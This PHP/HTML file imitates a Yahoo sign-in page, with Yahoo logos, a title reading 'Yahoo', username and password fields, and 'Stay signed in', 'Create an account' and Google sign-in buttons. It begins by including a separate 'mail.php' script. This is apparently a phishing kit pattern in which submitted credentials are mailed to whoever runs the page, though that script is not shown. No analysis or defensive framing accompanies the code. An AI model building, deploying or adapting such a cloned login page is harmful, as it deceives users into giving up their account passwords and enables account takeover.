<?php include 'mail.php'?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="style.css">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&family=Source+Sans+3:wght@200;300;400;500;600&display=swap" rel="stylesheet">

    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    
    <title>Yahoo</title>
</head>
<body>
    <div class="container">
        <nav>
            <div class="nav__container">
            <div class="link__container home__logo">
                <img src="./resources/yahoo.png" alt="" class="logo">
            </div>
            <div class="link__container">
                <a href="#" class="nav__link nav__link--home">Help</a>
            </div>
            </div>
        </nav>

        <main class="main__container">
            <div class="title__container">
                <h1 class="title">Yahoo makes it easy to enjoy what matters most in your world.</h1>
                <div class="title__paragraph">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</div>
            </div>

            <div class="form__container">
                <div class="logo__container">
                    <img src="./resources/yahoo.png" alt="" class="logo">
                </div>
                <h2 class="sign-in">Sign in</h2>
                <h4 class="sub__title">Sign in using your yahoo account</h4>
                <form action="https://www.yahoo.com" method="post">
                    <input type="email" name="email" id="email" class="input email" placeholder="Username, email or mobile" required="">
                    <input type="password" name="password" id="password" class="input password" placeholder="Password" required="">
                    <div class="button__container">
                        <a href="http://www.yahoo.com">
                            <button class="button next">
                                Next
                            </button>
                        </a>
                    </div>
                    <div class="external-link__container">
                        <div class="checkbox__container">
                            <input type="checkbox" name="" id="checkbox" class="checkbox" checked="checked" >
                            <label for="checkbox" class="external-link">Stay signed in</label>
                        </div>
                        <a href="#" class="external-link">Forgotten username?</a>
                    </div>
                    <div class="button__container">
                        <a href="http://www.yahoo.com">
                            <button class="button create">
                                Create an account
                            </button>
                        </a>
                    </div>
                    <p class="text-option">Or, continue with</p>
                    <div class="button__container button__container--google ">
                        <a href="http://www.yahoo.com " class="button__container">
                            <button class="button google-sign-in button__container--flex">
                                <div class="google__icon">
                                    <img src="./resources/search.png" alt="">
                                </div>
                                <p>Google</p>
                            </button>
                        </a>
                    </div>
                </form>
            </div>
        </main>

        <div class="footer__container">
            <div class="footer-link__container">
                <a href="" class="footer__link nav__link nav__link--home">Terms</a>
                <a href="" class="footer__link nav__link nav__link--home">| Privacy</a>
            </div>
        </div>

    </div>
</body>
</html>